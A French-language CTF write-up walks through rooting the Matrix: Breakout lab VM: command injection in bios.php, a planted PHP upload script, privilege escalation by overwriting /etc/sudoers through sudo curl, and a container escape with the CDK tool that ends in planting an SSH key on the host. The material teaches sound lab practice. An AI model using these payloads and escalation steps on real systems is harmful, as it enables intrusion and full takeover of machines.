# Solution du CTF Matrix: Breakout

Après avoir résolu [Matrix-Breakout: 2 Morpheus](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Matrix-Breakout%3A%202%20Morpheus%20de%20VulnHub.md) je me suis mis à la recherche du premier CTF de la série qui n'était pas disponible sur VulnHub.

Je l'ai retrouvé via cet article : [Linux Attack &amp; Defense: Matrix Breakout Edition | BeyondTrust - REAL security](https://www.real-sec.com/2022/07/linux-attack-defense-matrix-breakout-edition-beyondtrust/)

Voici le lien direct pour l'image virtuelle : https://matrix-breakout-inguardians.sfo2.digitaloceanspaces.com/matrix-breakout.ova

```
Nmap scan report for 192.168.242.130
Host is up (0.00060s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 05534d5565d198e088a6d7fbf0818a73 (RSA)
|   256 ac626864db6b6596a374ed9d586c78a5 (ECDSA)
|_  256 50f8a5322c6afc4c735edf63ba43972b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Matrix: Breakout
|_http-server-header: Apache/2.4.52 (Ubuntu)
```

La page d'index est statique et ne donne aucune information intéressante. Il aura fallut énumérer un petit moment avant d'obtenir quelque chose d'intéressant :

```shellsession
$ feroxbuster -u http://192.168.242.130/ -w /tools/DirBuster-0.12/directory-list-2.3-big.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.242.130/
 🚀  Threads               │ 50
 📖  Wordlist              │ /tools/DirBuster-0.12/directory-list-2.3-big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💲  Extensions            │ [php, html, htm, txt, zip]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200       17l       35w      398c http://192.168.242.130/index.html
301        9l       28w      317c http://192.168.242.130/bios
200       22l       44w      591c http://192.168.242.130/bios.php
403        9l       28w      280c http://192.168.242.130/server-status
```

## It was you RCE !

Dans le dossier `bios` on trouve différents fichiers sans extension. Il y a par exemple les fichiers `berg`, `bugs`, `lexy`, etc.

Le contenu de ces fichiers est un copier / coller de ce qui peut se trouver sur un wiki spécialisé dans la saga Matrix.

Le script `bios.php` permet de sélectionner un des personnage depuis une liste et le contenu du fichier correspondant (chargé depuis le dossier `bios`) est alors affiché :

```html
Which crew member's bio would you like to see?

<form action="/bios.php" method="get">
<select name="bio">
  <option value="">Select...</option>
  <option value="lexy">Lexy</option>
  <option value="berg">Berg</option>
  <option value="bugs">Bugs</option>
  <option value="morpheus">Morpheus</option>
  <option value="seek">Seek</option>
</select>
<input type="submit" name="submit" value="submit" />
```

J'ai immédiatement pensé à une faille de directory traversal alors j'ai modifié l'URL pour tenter de charger `/etc/passwd`.

J'ai alors eu :

```html
--- snip ---
<input type="submit" name="submit" value="submit" />

</p><p><!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at 127.0.0.1 Port 80</address>
</body></html>
</body>
</html>
```

On voit ici qu'on a a un message d'erreur 404 intégré au reste de la page. On est donc plus sur un cas de SSRF (*Server Side Request Forgery*).

En jouant avec le paramètre j'ai assez vite compris qu'on ne pouvait pas vraiment passer ce qu'on voulait : on obtient toujours l'erreur 404 en provenance du serveur même si on demande une URL externe ce qui signifie que le serveur fait une concaténation du type :

```php
$url = "http://127.0.0.1/bios/" + $_GET["bio"]
```

On a vu via l'énumération plus tôt que `server-status` est actif sur le serveur Apache. Si on passe `../server-status` on peut alors afficher la page normalement accessible seulement depuis localhost.

Mon idée était qu'il y avait peut être une tache planifiée qui tape sur un path secret et qu'il fallait le récupérer de cette façon... mais rien n'est venu.

Il m'a fallut un petit moment pour comprendre que l'on était en réalité face à une vulnérabilité d'exécution de commande (RCE) toute bête qui exécute un `curl` sans que les données du paramètre ne soient échapés. Du coup en passant `;id;` au paramètre `bio` j'obtiens ceci en fin de la page HTML :

```html
<address>Apache/2.4.52 (Ubuntu) Server at 127.0.0.1 Port 80</address>
</body></html>
uid=1000(trinity) gid=1000(trinity) groups=1000(trinity)
</body>
</html>
```

Récupérer un shell est alors assez simple, mis à part qu'il faut utiliser le port 80 pour les connexions sortantes.

Avec ce compte `trinity` j'obtiens le premier flag :

```shellsession
trinity@04584549e707:/$ cat FLAG-1.txt 
Flag{'trinity-must-escape-from-the-matrix'}

See if you can find your way to root for the next flag.

https://img.buzzfeed.com/buzzfeed-static/static/2021-12/23/17/asset/4ebab251a02a/sub-buzz-1655-1640279523-1.jpg
```

Afin de simplifier la suite j'ai déposé via encodage / décodage base64 le script PHP suivant pour uploader mes fichiers :

```php
<?php
if(!empty($_FILES['uploaded_file']))
{
    $path = "/tmp/" . basename($_FILES['uploaded_file']['name']);
    if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
      echo "uploaded";
    } else{
        echo "error";
    }
}
?>
```

Il s'utilise de cette manière :

```bash
curl -F "uploaded_file=@linpeas.sh" http://192.168.242.130/bios/upload.php
```

Au vu du nom d'hôte (que l'on voit dans l'invite de commande) on sait que l'on est dans un environnement Docker. On le voit aussi par rapport à l'absence de nombreux outils standards.

## Keep it simple stupid

L'utilisatrice peut exécuter `curl` en tant que root :

```shellsession
trinity@04584549e707:/tmp$ id
uid=1000(trinity) gid=1000(trinity) groups=1000(trinity)
trinity@04584549e707:/tmp$ sudo -l
Matching Defaults entries for trinity on 04584549e707:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trinity may run the following commands on 04584549e707:
    (ALL) NOPASSWD: /usr/bin/curl
```

Je ne me suis pas référé à GTFObins, je suis allé sur du très simple : utiliser curl pour lire et écrire des fichiers.

```shellsession
trinity@04584549e707:/tmp$ sudo /usr/bin/curl file:///etc/sudoers > sudoers_backup
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1713  100  1713    0     0  13.5M      0 --:--:-- --:--:-- --:--:-- 13.5M
trinity@04584549e707:/tmp$ echo "trinity ALL=(ALL) NOPASSWD: /usr/bin/bash" >> sudoers_backup
trinity@04584549e707:/tmp$ sudo /usr/bin/curl -s file:///tmp/sudoers_backup -o /etc/sudoers
trinity@04584549e707:/tmp$ sudo /usr/bin/bash
root@04584549e707:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@04584549e707:/tmp# cat /root/FLAG-2.txt 
Flag{'trinity-and-neo-reunited'}

You've made it to root, but you're in a container.  Can you break out?

https://www.nme.com/wp-content/uploads/2021/12/matrix-resurrections-2000x1270-1-1392x884.jpg
```

Sur ce container on ne trouve ni les exécutables Docker si le socket correspondant... C'est mal parti pour sortir du container.

J'ai uploadé un [nmap-static-binaries](https://github.com/opsec-infosec/nmap-static-binaries) histoire de voir si j'avais accès à des ports particuliers sur la machine hôte depuis le container mais rien de plus que je ne voyais déjà.

## Here Comes a New Challenger

Finalement j'ai découvert [CDK: 📦 Make security testing of K8s, Docker, and Containerd easier.](https://github.com/cdk-team/CDK). Il s'agit d'un outil d'exploitation pour s'échapper des containers.

J'ai joué un peu avec et j'ai finalement utilisé la commande `auto-escape`. Je pensais qu'elle me fournirait un shell directement mais elle permet en fait à injecter une commande dans la crontab :

```shellsession
root@04584549e707:/tmp# ./cdk_linux_amd64 auto-escape /bin/sh       

[Auto Escape - Privileged Container]
2022/11/21 12:30:19 Capabilities hex of Caps(CapInh|CapPrm|CapEff|CapBnd|CapAmb):
        CapInh: 0000003fffffffff
        CapPrm: 0000003fffffffff
        CapEff: 0000003fffffffff
        CapBnd: 0000003fffffffff
        CapAmb: 0000000000000000
        Cap decode: 0x0000003fffffffff = CAP_CHOWN,CAP_DAC_OVERRIDE,CAP_DAC_READ_SEARCH,CAP_FOWNER,CAP_FSETID,CAP_KILL,CAP_SETGID,CAP_SETUID,CAP_SETPCAP,CAP_LINUX_IMMUTABLE,CAP_NET_BIND_SERVICE,CAP_NET_BROADCAST,CAP_NET_ADMIN,CAP_NET_RAW,CAP_IPC_LOCK,CAP_IPC_OWNER,CAP_SYS_MODULE,CAP_SYS_RAWIO,CAP_SYS_CHROOT,CAP_SYS_PTRACE,CAP_SYS_PACCT,CAP_SYS_ADMIN,CAP_SYS_BOOT,CAP_SYS_NICE,CAP_SYS_RESOURCE,CAP_SYS_TIME,CAP_SYS_TTY_CONFIG,CAP_MKNOD,CAP_LEASE,CAP_AUDIT_WRITE,CAP_AUDIT_CONTROL,CAP_SETFCAP,CAP_MAC_OVERRIDE,CAP_MAC_ADMIN,CAP_SYSLOG,CAP_WAKE_ALARM,CAP_BLOCK_SUSPEND,CAP_AUDIT_READ
        Added capability list: CAP_DAC_READ_SEARCH,CAP_LINUX_IMMUTABLE,CAP_NET_BROADCAST,CAP_NET_ADMIN,CAP_IPC_LOCK,CAP_IPC_OWNER,CAP_SYS_MODULE,CAP_SYS_RAWIO,CAP_SYS_PTRACE,CAP_SYS_PACCT,CAP_SYS_ADMIN,CAP_SYS_BOOT,CAP_SYS_NICE,CAP_SYS_RESOURCE,CAP_SYS_TIME,CAP_SYS_TTY_CONFIG,CAP_LEASE,CAP_AUDIT_CONTROL,CAP_MAC_OVERRIDE,CAP_MAC_ADMIN,CAP_SYSLOG,CAP_WAKE_ALARM,CAP_BLOCK_SUSPEND,CAP_AUDIT_READ
[*] Maybe you can exploit the Capabilities below:
[!] CAP_DAC_READ_SEARCH enabled. You can read files from host. Use 'cdk run cap-dac-read-search' ... for exploitation.
[!] CAP_SYS_MODULE enabled. You can escape the container via loading kernel module. More info at https://xcellerator.github.io/posts/docker_escape/.
Critical - SYS_ADMIN Capability Found. Try 'cdk run rewrite-cgroup-devices/mount-cgroup/...'.
Critical - Possible Privileged Container Found.
2022/11/21 12:30:19 starting to deploy exploit
{
  "device": "/dev/sda1",
  "mountpoint": "/etc/resolv.conf",
  "fstype": "ext4",
  "opts": [
    "rw",
    "relatime",
    "bind"
  ]
}
{
  "device": "/dev/sda1",
  "mountpoint": "/etc/hostname",
  "fstype": "ext4",
  "opts": [
    "rw",
    "relatime",
    "bind"
  ]
}
{
  "device": "/dev/sda1",
  "mountpoint": "/etc/hosts",
  "fstype": "ext4",
  "opts": [
    "rw",
    "relatime",
    "bind"
  ]
}
2022/11/21 12:30:19 found 1 devices in total.
success! device /dev/sda1 was mounted to /tmp/cdk_FJvUy

[/tmp/cdk_FJvUy]
2022/11/21 12:30:19 trying to write crontab to:  /tmp/cdk_FJvUy/etc/crontab
2022/11/21 12:30:19 exploit success, shellcodes wrote to:  /tmp/cdk_FJvUy/etc/crontab
2022/11/21 12:30:19 exploit only suitable for cgroup v1

[Auto Escape - Shared Net Namespace]
2022/11/21 12:30:19 Cannot find vulnerable containerd-shim socket.
2022/11/21 12:30:19 exploit failed.

[Auto Escape - docker.sock]
2022/11/21 12:30:19 err found while stat docker.sock path.:
stat /var/run/docker.sock: no such file or directory
2022/11/21 12:30:19 exploit failed

[Auto Escape - K8s API Server]
2022/11/21 12:30:19 checking if api-server allows system:anonymous request.
err found while searching local K8s apiserver addr.:
err: cannot find kubernetes api host in ENV
        api-server forbids anonymous request.
        response:
load K8s service account token error.:
open /var/run/secrets/kubernetes.io/serviceaccount/token: no such file or directory
2022/11/21 12:30:19 exploit failed
2022/11/21 12:30:19 all exploits are finished, auto exploit success!
```

Qu'importe, je vois que le système de fichier hôte a été monté sous `/tmp/cdk_FJvUy`, c'est bien suffisant pour arriver à mes fins :

```shellsession
root@04584549e707:/tmp# echo ssh-rsa --- snip ma clé publique ssh snip --- > /tmp/cdk_FJvUy/root/.ssh/authorized_keys
```

Je peux alors me connecter et obtenir le dernier flag :

```shellsession
$ ssh root@192.168.242.130
Enter passphrase for key '/home/devloop/.ssh/id_rsa': 
Linux debian 5.10.0-15-amd64 #1 SMP Debian 5.10.120-1 (2022-06-09) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jul 10 05:36:42 2022
root@debian:~# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:~# ls
root@debian:~# ls /
FLAG-3.txt  bin  boot  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
root@debian:~# cat /FLAG-3.txt 
Flag{'trinity-can-fly'}

https://cdn3.whatculture.com/images/2021/12/b11f3b3c4c428f5f-600x338.jpg

Thank you for playing! Looking forward to the write-ups!

- Jay (@jaybeale)
```

Un outil de liste à ajouter dans ma liste :)

*Publié le 21 novembre 2022*
